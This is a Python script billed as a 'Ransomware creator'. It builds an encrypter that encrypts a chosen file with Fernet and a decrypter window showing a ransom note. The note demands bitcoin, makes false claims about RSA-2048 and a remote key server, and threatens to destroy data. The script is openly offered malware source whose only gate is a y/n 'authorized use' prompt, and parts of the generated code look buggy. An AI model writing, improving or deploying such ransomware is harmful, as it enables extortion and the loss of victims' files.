from time import sleep
from termcolor import cprint
from cryptoaddress import BitcoinAddress
from cryptography.fernet import Fernet
import re


choice = input ("You use this for authorized testing or educational purposes? (y/n) : ")

if choice == "y":
    cprint('''
    
                             __________
                          .~#########%%;~.
                         /############%%;`\\
                        /######/~\/~\%%;,;,\\
                       |#######\    /;;;;.,.|
                       |########\  /%;;;;;.,|
              XX       |##/~~\###%#;;;/~~\;,|       XX
            XX..X      |#|  o  \##%;/  o  |.|      X..XX
          XX.....X     |##\____/##%;\____/.,|     X.....XX
     XXXXX.....XX      \#########/\;;;;;;,, /      XX.....XXXXX
    X |......XX%,.@      \######/%;\;;;;, /      @#%,XX......| X
    X |.....X  @#%,.@     |######%%;;;;,.|     @#%,.@  X.....| X
    X  \...X     @#%,.@   |# # # % ; ; ;,|   @#%,.@     X.../  X
     X# \.X        @#%,.@                  @#%,.@        X./  #
      ##  X          @#%,.@              @#%,.@          X   #
    , "# #X            @#%,.@          @#%,.@            X ##
       `###X             @#%,.@      @#%,.@             ####'
      . ' ###              @#%.,@  @#%,.@              ###`"
        . ";"                @#%.@#%,.@                ;"` ' .
          '                    @#%,.@                   ,.
          ` ,                @#%,.@  @@                `
                              @@@  @@@                  .
                              
                 Ransomware creator by ThunderStorm
    ''', 'green')

    regex = r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b'
    kEy = Fernet.generate_key()

    name = input("Name of Ransomware: ")
    key = input("Key der verwendet werden soll: ")
    btc = input("Bitcoins: ")
    btc_address = input("Bitcoin Address: ")
    mail_address = input("Mail Address: ")
    # prompts the user to select a file to encrypt
    filepath = input("Filepath to encrypt : ")

    f = open("encrypter.py", "w")
    f.write(f'''
# import required module
from cryptography.fernet import Fernet

keY = {kEy}
filename = "{filepath}"

fernet = Fernet(keY)
with open("key.key", "rb") as file :
    # read the encrypted data
    encrypted_data = file.read()
# decrypt data
decrypted_data = fernet.decrypt(encrypted_data)
# write the original file
with open("key.key", "wb") as file :
    file.write(decrypted_data)

with open(filename, "rb") as file:
    # read the encrypted data
    data = file.read()
# decrypt data
encrypted_data = fernet.encrypt(data)
# write the original file
with open(filename, "wb") as file:
    file.write(encrypted_data)

# opening the key
with open('key.key', 'rb') as filekey:
    key = filekey.read()
# encrypting the file
encrypted = fernet.encrypt(key)
# opening the file in write mode and
# writing the encrypted data
with open('key.key', 'wb') as encrypted_file:
    encrypted_file.write(encrypted)
    ''')
    f.close()

    try :
        bitcoin_address = BitcoinAddress(btc_address, network_type='mainnet')
        print(f'The address "{btc_address}" is valid.')

        # using the generated key
        fernet = Fernet(kEy)

        # key save
        f = open("key.key", "w")
        f.write(key)
        f.close()
        # opening the original file to encrypt
        with open('key.key', 'rb') as file :
            original = file.read()
        # encrypting the file
        encrypted = fernet.encrypt(original)

        # opening the file in write mode and
        # writing the encrypted data
        with open('key.key', 'wb') as encrypted_file :
            encrypted_file.write(encrypted)

        f = open("decrypter.py", "w")
        f.write(f'''
from tkinter import *
from cryptography.fernet import Fernet
from tkinter import messagebox

root = Tk()
root.geometry("900x900")
root.title('Decrypter')
root.configure(bg='red')

keY = {kEy}

def decrypt():

    f = Fernet(keY)
    with open("key.key", "rb") as file:
        # read the encrypted data
        encrypted_data = file.read()
    # decrypt data
    decrypted_data = f.decrypt(encrypted_data)
    # write the original file
    with open("key.key", "wb") as file:
        file.write(decrypted_data)

    filename = "{filepath}"
    
    with open(filename, "rb") as file:
        # read the encrypted data
        encrypted_data = file.read()
    # decrypt data
    decrypted_data = f.decrypt(encrypted_data)
    # write the original file
    with open(filename, "wb") as file:
        file.write(decrypted_data)
        
        # opening the key
    with open('key.key', 'rb') as filekey:
        key = filekey.read()
    # encrypting the file
    encrypted = f.encrypt(key)
    # opening the file in write mode and
    # writing the encrypted data
    with open('key.key', 'wb') as encrypted_file:
        encrypted_file.write(encrypted)

def Take_input():
    if key == Key :
        decrypt()
    elif key == None or key == '':
        messagebox.showwarning('Error', 'No key given. Canceled...')
    else :
        print(" ")

l = f"Noo your PC is infeced with {name} Software"
ll = f"""
                    Your personal files are encrypted!

        Your important files encryption produced on this computer: photos, videos, documents, etc.

        Encryption was produced using a unique public key RSA-2048 generated for this computer. 
        To decrypt files you need to obtain the private key.

        This single copy of the private key, which will allow you to decrypt the files, located on a secret server on the Internet.
        The server will destroy the key after a time specified in this window. After that, nobody and never will be able to restore files.

        ! Important !
        To obtain the private key for this computer, which will automatically decrypt files, you need to pay {btc} Bitcoins to this Bitcoin Address:

        {btc_address}

        Check to check your key. But Don't try a random Password. This Software will delete all Data on the first wrong attempt. 
        If you send proof of Bitcoin payment to the following email address you will receive the decryption key.
        Mail address:

        {mail_address}

        Don't try to rename your Files or destroy or remove the ransomware, if you do it,then say bye bye to your computer
        You have no chance to escape this Ransomware if you don't pay the Bitcoins


        Any attempt to remove or damage this software will lead to immediate destruction of the private key by server."""

filename = 'key.key'
with open(filename) as f_obj:
    Key = f_obj.read()

    L = Label(root, text= l, bg="#f00", fg="#fff")
    LL = Label(root, text= ll, bg="#f00", fg="#fff")

    KEy = Label(root, text="Key ", bg="#f00", fg="#fff")
    key = Text(root, height=1,
                         width=25,
                         bg="light yellow")

    # button
    Display = Button(root, height=1,
                                width=20,
                                text="CHECK",
                                command=lambda : Take_input())

# order
L.pack()
LL.pack()
KEy.pack()
key.pack()
Display.pack()

mainloop()
            ''')
        f.close()
    finally:
        print("")
